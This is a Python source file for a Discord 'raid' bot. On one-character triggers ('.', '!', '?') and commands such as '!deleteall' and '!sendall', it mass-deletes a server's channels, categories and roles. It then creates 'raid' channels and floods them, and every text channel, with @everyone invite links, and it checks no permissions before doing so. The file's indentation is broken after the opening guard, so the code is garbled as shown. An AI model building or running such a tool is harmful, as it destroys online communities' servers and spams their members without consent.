import discord
import asyncio
import os

TOKEN = os.environ.get("DISCORD_BOT_TOKEN")

DEFAULT_LINK = "https://discord.gg/nF4YCQwGt"

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print(f"Bot eingeloggt als {client.user}")
    await client.user.edit(username="Corazon")


@client.event
async def on_message(message):
    if message.author.bot:
        return

content = message.content.strip()

if content == ".":
guild = message.guild
channels = list(guild.channels)
non_cats = [c for c in channels if not isinstance(c, discord.CategoryChannel)]
cats = [c for c in channels if isinstance(c, discord.CategoryChannel)]
roles = [r for r in guild.roles if not r.managed and r.name != "@everyone"]

await asyncio.gather(*[c.delete() for c in non_cats], *[r.delete() for r in roles])
await asyncio.gather(*[c.delete() for c in cats])

async def create_and_spam(i):
ch = await guild.create_text_channel(f"raid-{i+1}")
await asyncio.gather(*[ch.send(f"@everyone {DEFAULT_LINK}") for _ in range(100)])

await asyncio.gather(*[create_and_spam(i) for i in range(10)])
return

if content == "!":
guild = message.guild
channels = list(guild.channels)
non_cats = [c for c in channels if not isinstance(c, discord.CategoryChannel)]
cats = [c for c in channels if isinstance(c, discord.CategoryChannel)]

await asyncio.gather(*[c.delete() for c in non_cats])
await asyncio.gather(*[c.delete() for c in cats])
return

if content == "?":
guild = message.guild
channels = list(guild.channels)
non_cats = [c for c in channels if not isinstance(c, discord.CategoryChannel)]
cats = [c for c in channels if isinstance(c, discord.CategoryChannel)]
roles = [r for r in guild.roles if not r.managed and r.name != "@everyone"]

await asyncio.gather(*[c.delete() for c in non_cats], *[r.delete() for r in roles])
await asyncio.gather(*[c.delete() for c in cats])
return

if not content.startswith("!") or len(content) == 1:
return

cmd = content[1:].split()[0].lower()

if cmd == "deleteall":
guild = message.guild
channels = list(guild.channels)
non_cats = [c for c in channels if not isinstance(c, discord.CategoryChannel)]
cats = [c for c in channels if isinstance(c, discord.CategoryChannel)]
await asyncio.gather(*[c.delete() for c in non_cats])
await asyncio.gather(*[c.delete() for c in cats])
return

if cmd == "send":
await message.channel.send(DEFAULT_LINK)
return

if cmd == "sendall":
guild = message.guild
text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
await asyncio.gather(*[c.send(DEFAULT_LINK) for c in text_channels])
return

if cmd == "kanäle":
names = [f"#{c.name}" for c in message.guild.channels if isinstance(c, discord.TextChannel)]
await message.reply(f"**Text-Kanäle:** {', '.join(names) or 'keine gefunden'}")
return


client.run(TOKEN)
